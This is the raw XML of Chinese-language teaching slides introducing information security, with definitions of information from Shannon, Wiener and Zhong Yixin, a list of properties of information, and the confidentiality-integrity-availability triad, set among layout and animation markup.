        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="1673752"/>
            <a:ext cx="8191500" cy="1440161"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识子域：信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>的性质</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>理解信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>基本概念，理解信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>基本属性</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>理解信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>的基本功能</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="3356992"/>
            <a:ext cx="8614706" cy="1409617"/>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zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>知识子域：信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>与网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>理解网络空间安全的基本属性：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>保密性、完整性和可用性</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>网络空间安全的特征与范畴</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22565691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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="5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560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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15" dur="5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56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12187"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>信息的概念</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1907704" y="1638026"/>
            <a:ext cx="6768752" cy="1261884"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="50000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>信息论创始人</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>香农</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 Claude Elwood Shannon </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>信息是用以消除不确定性的东西</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>，推导出了信息测度的数学公式 。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg2"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1907704" y="2967314"/>
            <a:ext cx="6852884" cy="1631216"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="50000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>控制论的创始人</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>维纳</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Norbert Wiener</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宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>：“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>信息是人们在适应外部世界，并使这种适应反作用于外部世界的过程中，同外部世界进行交换的内容的名称</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>” 。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1907704" y="4684351"/>
            <a:ext cx="6768752" cy="892552"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>中国学者</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>钟义信</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>：“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>信息是事物运动的状态与方式，是事物的一种属性</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>” 。 </a:t>
            </a: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527" y="1633334"/>
            <a:ext cx="1276536" cy="1266576"/>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527" y="3116858"/>
            <a:ext cx="1276536" cy="1495485"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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0583" y="4635503"/>
            <a:ext cx="1317122" cy="1097753"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23332618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5392" y="733519"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> 信息的性质</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338064" y="1484784"/>
            <a:ext cx="7920880"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依附性</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>：用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>符号</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>表示；依附于一定的物理介质  </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="266056" y="5218753"/>
            <a:ext cx="7139136"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可伪性：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>信息是可以伪造的 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="313605" y="2008010"/>
            <a:ext cx="7890124"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动态性：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>信息只有及时、新颖才有价值 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="矩形 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="335392" y="2522534"/>
            <a:ext cx="7995560"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可处理性</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>：内容可以识别，形式可以转换或变换 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="矩形 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="313605" y="3058513"/>
            <a:ext cx="4551246" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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共享性</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>：信息可无限扩散 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="矩形 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="282849" y="3562569"/>
            <a:ext cx="7920880"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可传递性</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>：在时间和空间上都具有传递性 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="矩形 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="266056" y="4066625"/>
            <a:ext cx="7995560"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异步性：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>以存储方式来接收，在任何时间使用</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="矩形 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="266056" y="4642689"/>
            <a:ext cx="6970240"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可交换性：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>可在两个主体间实现信息的交换 </a:t>
            </a:r>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161" y="5003343"/>
            <a:ext cx="1272319" cy="1167135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41098669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arn(inVertical)">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barn(inVertical)">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ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="40" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="12"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">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 calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="46" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="47" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="4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7" grpId="0"/>
      <p:bldP spid="8" grpId="0"/>
      <p:bldP spid="9"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335392" y="733519"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> 课堂思考</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="AutoShape 2" descr="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAEsAZc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uKKKK9w+VCiiigAooooAKWkpaaAKSlooASilooAKKKKACiiigAooooYCUtJS0IApKWkpALRRRTAKKKKACkpaKACikooAWkoopAFFFFABS0lLTQBRRRQAUUUUAFFFFABSUtFACUtFFABRRRQAUUUUABooNFJiYCikooGFFLSUwClpKWhAFFFFABSUtFAAKKKSkAUUtJTAKKKWgBKWiigAooooAKKKTv70AFFWRYz+X5kuy2jP8cz7f0pjNpcY+a/Zz6QQEj8zXLWxuHpfHNI1VCo9bEVFSfadJA+9ff98rQsmlycC9niP/AE0g4/SsI5rg27c6K+ry8iOirK2LyqWtJYbkDnETfMP+AmqpDKxVlKsOqkc12wqQqK8JXM505w+JBRS0VoQJS0UUAFFFFABRRRQAUlLRQAUlFFABS0lLQgCkpaSkAtFFFMApKWigBKWiigANFBoqWJhQKSlqhhRRRQACiiigAooooAKSlooABRRSUgClFFJTQC0UUUAJRS0lIApe9ApQrOwRBlmOAKASu7D7e3kupCiYAHzM7cKg96bLqsVsWTTVDN3u5Blm/wB0dhRq84twNLgP7uPm4Yfxv6fSsnPB9fbtXyGaZtOc3SouyW/mdkYqlot+46SR5pC8ztI5/idsmm/hXN+NPEVz4d0+3a0hQzXEmwSScpHj+tZ/grxdf65qE2n38cTssXmrNEmzb7MK8hYWpKl7boaqjNw9odpRRjpn0ri/Gvi2/wBCv7ewsI41eSLzXnlTfuz2UdKzoUZVpKMSKdOVSXLE7QcMGBKsOjKcEVpwawXVYtRT7VD2kAxKn0PeuH8F+I7rxDYXLXkaLNbOFMsYwsgPTjsa6XOO9aKdbCVWouzQ5c1OTizbnt/LjWeKQT20n3JQP0Poag6CodJ1BLW4MM2HtJ/klX+771burV7S5eFsnb0bBwR2r7LLMxWLp+98SMKtJJc8NvyZDRQCD0or1DnClpKWmgAUUUUAAooooASloooAKSlooAKBRRQAUlLSUALRRRSABRR9KKaADRQaKTEwoopKYxaSlpKQC0lFLQAUc0lLTASlopKQC80UUlMBeaSlooASlpKWgAooooAOau6OoOpI7DIjRn/IVS71d0hlXU41Y8SK0f5isq6fs5W7GtC3tI37nPs7SyPI5+Z2LH8aSnPG0MrwsMNGxUj6UlfmjvfU3fmQ3VpbX1u1vd28dxA3WORciorDTbDTI2jsLSG2VvvCNeW+pq3RTUpJct9A5na1xPT9KrXumWWqIsF7Yx3ahv3aOmSD7d6sntwa7PQ9IXT4FuJlzdyDPP8AyzHoK6cJh51p2i7W6mtGlKpLTQxtI8GR21skciR2NuOVtoFAP4ntXQwaPp1sB5dnEx/vS/O361eP0/8Ar1ma54h0jw1aJdaxfR2kLttTdks59Ao5Ne/SwlKnsrvuz1IUYQ6a+ZpKAgwqqo/2QKeJHH8XFZ2j63pniCxF9pN7Fd224qWj42n0I6g1f9K6UkjQjlt4Lj/XQRyZ7soz+dZlzoMTAtaymNv7khyv51TvfHvhXTdXOk3mtW8V6GCtHyQjejMBhTXRg7gOQQRkEcg1pCpODvFmVTD06nxI42aGW3mMUyFHHY0w9K666tY763MMvX+B8coa5OaGS3maGUfMhr0qFdVVbqeLisM6DutUxtFJ9aWuhHKFFJS0AFJS0lIBaOaKOKADmkpeKOKAEpaPpRTQBRRRxSAOaKPpRTQBRScUVLEwopaUDPA/KqYxOxJ6DqfSkR0kUtG6uvTKMGH6V5N478UHV9QbTrOVv7PtzhipwJ39foK5nT9SvdJmE2n3cls/cxnhvqO9ZOpY6Y4ZtXvqfQHaivONI+JzjbFrVpuGf+Pi26/ild1puradrEPmadeRXA7qDh1+qnkVakmZTpShuXaKKSqRmLRRRQAUUUUAFFFFABRSUtABRSUtACUuSpDKcMpyD70UfSgNtiTVLf7ZGdTgG5+lzGP4T/e+hrHGOMd614ZpLeXzInKN6/4io7+G1e1N5DGYJPN2PEPuMeuV9K+RzfKnSviKfw9TrjNVFfr+Zm0YpCQo5OKAQe/6186Bf0O3W61u2jflQd5/Cu7J3MW9a4bQrhbXXLZ2+6TsP413B4bb6cV72VW9i7b3PSwVuR+ov864v4g/D6HxzBZsL42V5Z7vKkKb0ZW6gr/WuzoNeqdpyngLwRB4G0u5tkvGu7m6cSTS7dicDACr6V1a/KQ3pRxRQB5Jq/wMttS8QXF7DrbwWV1K0ssDQ73Unlgr5xivV7eCO0tYLaEN5UEaxJu5O1Rgc1JRQAVieIoRm3uR95vkY1tnpWP4ikHkW0f8RYv+Fb4a/tVY5Mak6LMKijHSkr1jwBaSlooAKKSloASlpKWgBKWkxmlwBQAfl9TWF4g8Wad4caOK5Es1zINyww/eA9T2FbleN/EG